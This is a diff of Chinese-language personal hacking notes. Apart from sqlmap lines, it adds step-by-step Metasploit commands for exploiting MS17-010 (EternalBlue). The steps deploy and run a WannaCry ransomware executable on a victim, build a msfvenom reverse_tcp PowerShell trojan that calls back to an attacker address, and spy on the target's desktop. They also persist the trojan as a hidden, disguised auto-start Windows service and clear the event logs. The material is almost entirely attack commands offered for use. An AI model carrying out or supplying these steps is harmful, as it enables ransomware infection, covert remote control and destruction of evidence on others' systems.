@@ -6,7 +6,29 @@
 ④测试指定数据表中的数据：sqlmap-u "你要测试的网址"-D "数据库名"-T 数据表名字 --dump
 
 2.WannaCry:永恒之蓝（微软漏洞编号：MS17-010） 工具：美少妇
-   终端：msfconsole
+   终端：msfconsole   search ms17
     use 使用
        options 查看相关配置  RHOSTS 受害者IP
        set 设置相关系数
+    meterpreter：控制窗口 meterpreter > shell
+     msg * "hello"
+  传入病毒：upload C:/Users/Administrator/Desktop/Ransom.WannaCryptor.exe C:/windows/temp
+  运行病毒：execute -f C:/Windows/temp/Ransom.WannaCryptor.exe
+  生成木马：msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=端口 -f psh-reflection >1.ps1  （端口：1000-655345）
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.72.129 LPORT=6688 -f psh-reflection > 1.ps1
+
+  接收木马：msfconsole
+            use exploit/multi/handler
+            set payload windows/x64/meterpreter/reverse_tcp
+            set lport 端口
+            run
+   获取微信：screenshot 截取桌面截图，screenshare   实时监控目标桌面
+   
+   
+   
+   1.移动木马到C盘 mv 1.ps1 C:/Windows/1.ps1  
+   2.创建服务：sc create shell start= auto binPath= "cmd.exe /k powershell.exe -w hidden.ExecutionPolicy Bypass -NoExit -File C:\Windows\1.ps1" obj= Localsystem
+   3.伪装服务，设置描述：sc description"shell""绝对安全的shell哈哈哈"    
+   4.开机启动：sc config "shell" start=auto
+   5.服务隐藏：![alt text](image.png)
+   6.清除日志：meterpreter下输入：clearev
